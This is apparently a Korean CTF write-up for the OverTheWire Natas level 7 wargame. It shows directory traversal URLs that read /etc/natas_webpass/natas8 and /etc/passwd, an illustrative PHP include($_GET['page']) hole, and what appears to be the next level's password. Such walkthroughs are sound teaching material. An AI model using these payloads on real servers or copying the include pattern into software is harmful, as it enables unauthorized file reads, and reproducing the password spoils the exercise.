@@ -1,0 +1,39 @@
+natas7에 소스 코드에 들어가면 다음과 같은 힌트가 존재함.
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+
+즉 /etc/natas_webpass/natas8 경로로 들어가봄.
+http://natas7.natas.labs.overthewire.org/etc/natas_webpass/natas8
+하지만 접속이 되지 않음.
+
+메인 페이지에 있는 home과 about을 눌러보면 각각 아래와 같은 주소가 뜸.
+natas7.natas.labs.overthewire.org/index.php?page=home
+natas7.natas.labs.overthewire.org/index.php?page=about
+즉, GET 방식으로 page 라는 메개변수 값을 사용하는것을 알 수 있음.
+
+따라서 다음과 같은 주소로 접속 가능함.
+http://natas7.natas.labs.overthewire.org/?page=../../../../../../etc/natas_webpass/natas8
+
+여기서 중요한 Direcroty Traversal 이 등장.
+디렉토리 트래버설이란 사용자가 ../(상위 디렉토리 이동) 같은 경로를 입력해서 웹 서버의 제한된 영역 바깥의 파일에 접근하는 공격방식임.
+
+
+서버가 다음과 같이 구성된다고 가정.
+/var/www/html/
+├── index.php
+├── about.html
+├── home.html
+└── includes/
+    └── config.php
+
+서버 코드는 다음과 같이 가정.
+<?php
+$page = $_GET['page'];
+include($page);
+?>
+
+이때 http://example.com/?page=home.html 이런 주소로 접근하게 되면 include("home.html") 이 되고 정상 작동함.
+만약 http://example.com/?page=../../../../etc/passwd 이러한 주소로 접근하게 되면 include("../../../../etc/passwd") 처럼 동작함.
+즉 서버 시스템의 상위 파일로 올라가 시스템 파일인 /etc/passwd 를 읽어서 출력이 가능해짐.
+
+
+xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
